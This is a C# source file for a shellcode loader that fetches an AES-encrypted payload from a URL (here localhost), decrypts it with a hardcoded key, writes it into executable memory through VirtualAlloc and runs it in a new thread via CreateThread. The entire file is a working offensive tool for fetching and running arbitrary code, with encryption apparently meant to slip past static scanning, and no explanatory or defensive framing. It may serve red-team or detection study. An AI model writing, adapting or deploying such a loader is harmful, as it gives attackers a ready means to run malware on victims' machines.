
using System;
using System.Net;
using System.Runtime.InteropServices;
using static System.Runtime.InteropServices.JavaScript.JSType;
using System.Security.Cryptography;
using System.Text;

namespace ShellcodeLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            string ShellcodeUrl = "http://localhost:8081/sc.txt";
            string EncryptedShellcode = "";

            try
            {
                WebClient wc = new System.Net.WebClient();
                EncryptedShellcode = wc.DownloadString(ShellcodeUrl);
                
            }
            catch
            {
                Console.WriteLine("[!] Error downloading shellcode!");
            }

            string ShellcodeB64 = Dec(EncryptedShellcode);
            byte[] x64shellcode = Convert.FromBase64String(ShellcodeB64);




            IntPtr funcAddr = VirtualAlloc(
                              IntPtr.Zero,
                              (ulong)x64shellcode.Length,
                              (uint)StateEnum.MEM_COMMIT,
                              (uint)Protection.PAGE_EXECUTE_READWRITE);
            Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.Length);

            IntPtr hThread = IntPtr.Zero;
            uint threadId = 0;
            IntPtr pinfo = IntPtr.Zero;

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        public static string Dec(string ciphertext)
        {
            string key = "01010101010101010101010101010101"; // CHANGE THIS 16/24/32 BYTE VALUE TO MATCH ENCRYPTION KEY

            byte[] iv = new byte[16];
            byte[] buffer = Convert.FromBase64String(ciphertext);

            using (Aes aes = Aes.Create())
            {
                aes.Key = Encoding.UTF8.GetBytes(key);
                aes.IV = iv;

                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

                using (MemoryStream ms = new MemoryStream(buffer))
                {
                    using (CryptoStream cs = new CryptoStream((Stream)ms, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader sr = new StreamReader((Stream)cs))
                        {
                            return sr.ReadToEnd();
                        }
                    }
                }
            }
        }

        #region pinvokes
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr,
            ulong size,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
        }
        #endregion
    }
}